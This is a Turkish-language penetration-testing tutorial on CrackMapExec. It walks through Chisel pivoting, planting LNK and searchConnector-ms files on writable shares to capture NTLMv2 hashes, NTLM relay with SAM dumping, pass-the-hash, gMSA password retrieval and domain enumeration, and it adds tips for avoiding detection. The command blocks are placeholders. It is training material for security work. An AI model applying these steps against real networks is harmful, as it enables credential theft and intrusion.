İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


